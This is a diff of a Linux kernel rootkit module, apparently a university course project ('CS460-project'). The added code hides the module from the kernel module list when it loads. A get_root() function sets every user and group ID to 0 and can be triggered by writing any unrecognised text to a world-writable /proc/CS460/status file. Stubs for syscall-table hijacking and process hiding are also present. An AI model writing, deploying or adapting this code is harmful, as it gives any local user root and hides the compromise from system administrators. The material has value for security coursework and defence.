@@ -11,6 +11,8 @@
 #include <linux/syscalls.h>
 #include <linux/fcntl.h>
 #include <linux/kobject.h>
+#include <linux/cred.h>
+#include <linux/sysfs.h>
 
 #include "rootkit.h"
 
@@ -20,23 +22,10 @@ MODULE_AUTHOR("thanomk2");
 MODULE_DESCRIPTION("CS460-project");
 
 
-
 #define PROCFS_NAME "CS460"
-#define _DEBUG_
 
 static int get_syscall_table(void);
 
-static ssize_t mp1_read(struct file *file, char __user *buffer, size_t count, loff_t *data);
-static ssize_t mp1_write(struct file *file, const char __user *buffer, size_t count, loff_t *data);
-
-static int parse_input(char *commands);
-static int hide_process(int pid);
-
-static void enable_write_protect(void);
-static void disable_write_protect(void);
-
-static int hide_self(void);
-static int unhide_self(void);
 
 // proc file pointers
 static struct proc_dir_entry *proc_dir;
@@ -46,10 +35,10 @@ static struct proc_dir_entry *proc_dir_entry;
 static spinlock_t lock;
 
 // flags
-static int is_rootkit_hidden;
+static int is_rootkit_hidden = 0;
 
 // Syscall table pointers
-static unsigned long long syscall_table_pointer;
+static void **syscall_table_pointer;
 
 // Module argument
 static char* sys_call_table_addr_input;
@@ -68,8 +57,8 @@ typedef struct process_info{
 struct file_operations procFile_fops = {
 
     .owner = THIS_MODULE,
-    .read = mp1_read,
-    .write = mp1_write,
+    .read = rootkit_read,
+    .write = rootkit_write,
 
 };
 
@@ -118,52 +107,40 @@ static void disable_write_protect(void){
 */
 static int get_syscall_table(void){
 	
-	// Should use kstrtoull() instead, but this deprecated function is cleaner
-	// since we don't have to malloc new var.
-	if(  (syscall_table_pointer = simple_strtoull(sys_call_table_addr_input, NULL, 16)) ){
+	syscall_table_pointer = (void**)sys_call_table_addr_input;
 
-		pr_info("get syscall_table successfull");
+	pr_info("Disabling write-protection...");
 
-		pr_info("Disabling write-protection...");
+	enable_write_protect();
 
-		enable_write_protect();
+	// TODO: ADD syscall hijack
 
-		// TODO: ADD syscall hijack
+	disable_write_protect();
 
-		disable_write_protect();
+	pr_info("Enabling write-protection...");
 
-		pr_info("Enabling write-protection...");
-
-		return 0;	
-	}
-
-	pr_info("get syscall_table failed");
-
-	return -EINVAL;	
+	return 0;	
+	
 }
 
-static struct kobject backup_module_kobj;
-static struct module this_module;
-// static struct list_head *module_list;
+struct list_head *module_list;
+
+// struct kobject backup_module_kobj;
+
 static int hide_self(void){
 
 	if(!is_rootkit_hidden){
 
 		// Store previous module list_head to restore later
-		// module_list = THIS_MODULE->list.prev;
-		this_module = *THIS_MODULE;
-		//list_add(THIS_MODULE->list.prev,&moduleList);
+		module_list = THIS_MODULE->list.prev;
 
-		// // Backup this model kernel_object
-		backup_module_kobj = THIS_MODULE->mkobj.kobj;
-
-		// Not sure how to backup this for now.
-		kobject_del(&(THIS_MODULE->mkobj.kobj));
+		// backup_module_kobj = THIS_MODULE->mkobj.kobj;
 		
-
-		list_del(&(THIS_MODULE->list));
-
+		// // Not sure how to restore this for now.
+		// kobject_del(&(THIS_MODULE->mkobj.kobj));
 		
+		list_del(&THIS_MODULE->list);
+
 		is_rootkit_hidden = 1;
 
 		pr_info("Hide successfull.");
@@ -174,22 +151,27 @@ static int hide_self(void){
 
 static int unhide_self(void){
 
-	int ret;
+	// int ret;
 
-	if(is_rootkit_hidden){
+	if(is_rootkit_hidden == 1){
 
-		list_add( &(THIS_MODULE->list), &this_module.list);
+		list_add(&THIS_MODULE->list, module_list);
 
-		this_module.mkobj.kobj = backup_module_kobj;
-	
-		ret = kobject_add(&this_module.mkobj.kobj, this_module.mkobj.kobj.parent, "rootkit");
 
-		if(ret){
-			kobject_put(&this_module.mkobj.kobj);
-			return -1;
-		}
+		// THIS_MODULE->mkobj.kobj = backup_module_kobj;
 		
-
+		// ret = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rootkit");
+		
+		// if(ret){
+		// 	pr_info("restore kobj failed.");
+		// 	kobject_put(&THIS_MODULE->mkobj.kobj);
+		// 	return -1;
+		// }
+		// else{
+		// 	kobject_uevent(&THIS_MODULE->mkobj.kobj, KOBJ_ADD);
+		// 	sysfs_create_mount_point(&THIS_MODULE->mkobj.kobj, "holders");
+		// }
+		
 
 		is_rootkit_hidden = 0;
 
@@ -203,15 +185,32 @@ static int unhide_self(void){
 
 static int hide_process(int pid){
 
-	unsigned long tmpFlags;
+	// Todo: add hide process
 
-	process_info *proc = kmalloc(sizeof(process_info), GFP_KERNEL);
+	return 0;
+}
 
-	spin_lock_irqsave(&lock, tmpFlags);
+static int get_root(void){
 
-		list_add(&proc->list, &procList);
+	struct cred *task_credential;
 
-	spin_unlock_irqrestore(&lock, tmpFlags);
+	// altering the credential		
+	task_credential = prepare_creds();
+
+	if(!task_credential){
+
+		return -ENOMEM;
+	}
+
+	task_credential->uid.val = 0; 
+	task_credential->suid.val = 0;
+	task_credential->euid.val = 0;
+
+    task_credential->gid.val = 0;
+    task_credential->sgid.val = 0;
+    task_credential->egid.val = 0;
+    
+    commit_creds(task_credential);
 
 	return 0;
 }
@@ -220,9 +219,8 @@ static int hide_process(int pid){
 static int parse_input(char *commands){
 
 	int pid;
-	
 
-	if(strcmp(commands, "pid") == 0){
+	if( strcmp(commands, "pid") == 0){
 
 		// skip space
 		commands = strsep(&commands, " ");
@@ -247,11 +245,8 @@ static int parse_input(char *commands){
 	}
 	else{
 
-		#ifdef _DEBUG_
-
-		pr_info("Unknow command.");
-
-		#endif /*_DEBUG_*/
+		get_root();
+		
 	}
 
 	return 0;
@@ -259,7 +254,7 @@ static int parse_input(char *commands){
 }
 
 // write output to /proc
-static ssize_t mp1_read(struct file *file, char __user *buffer, size_t count, loff_t *data){
+static ssize_t rootkit_read(struct file *file, char __user *buffer, size_t count, loff_t *data){
 
     int copied;
     unsigned long tmpFlags;
@@ -305,17 +300,19 @@ static ssize_t mp1_read(struct file *file, char __user *buffer, size_t count, lo
 
 
 // Read input from /proc
-static ssize_t mp1_write(struct file *file, const char __user *buffer, size_t count, loff_t *data){
+static ssize_t rootkit_write(struct file *file, const char __user *buffer, size_t count, loff_t *data){
 
     char *buf;
 
     buf = (char *) kzalloc(count, GFP_KERNEL);
 
     if(copy_from_user(buf, buffer, count)){
+
+    pr_info("Error reading from /proc");
       return -EFAULT;
     }
 
-    pr_info("%s\n", buf);
+    buf[strlen(buf) - 1] = '\0';
 
     parse_input(buf);
 
@@ -326,14 +323,11 @@ static ssize_t mp1_write(struct file *file, const char __user *buffer, size_t co
     return count;
 }
 
-static void initialize_var(void){
 
-	is_rootkit_hidden = 0;
-}
-
-// mp1_init - Called when module is loaded
-int __init mp1_init(void)
+int __init rootkit_init(void)
 {
+	is_rootkit_hidden = 0;
+
     // First create new directory under /proc
     proc_dir = proc_mkdir(PROCFS_NAME, NULL);
 
@@ -342,7 +336,7 @@ int __init mp1_init(void)
        return -ENOMEM;
     }
 
-    // create the status file under our /mp1 directory         
+    // create the status file       
     proc_dir_entry = proc_create("status", 0666 , proc_dir, &procFile_fops);
 
     if(proc_dir_entry == NULL){
@@ -355,19 +349,16 @@ int __init mp1_init(void)
     // initialize spin_lock
     spin_lock_init(&lock);
 
-    initialize_var();
-
 	get_syscall_table();
 
 	hide_self();
 
-    pr_alert("MP1 MODULE LOADED\n");
+    pr_alert("MODULE LOADED\n");
 
     return 0;   
 }
 
-// mp1_exit - Called when module is unloaded
-void __exit mp1_exit(void)
+void __exit rootkit_exit(void)
 {
     struct process_info *currProc;
     struct process_info *n;
@@ -385,10 +376,10 @@ void __exit mp1_exit(void)
     unhide_self();
    
 
-    pr_alert("MP1 MODULE UNLOADED\n");
+    pr_alert("MODULE UNLOADED\n");
 }
 
 // Register init and exit funtions
-module_init(mp1_init);
-module_exit(mp1_exit);
+module_init(rootkit_init);
+module_exit(rootkit_exit);
 
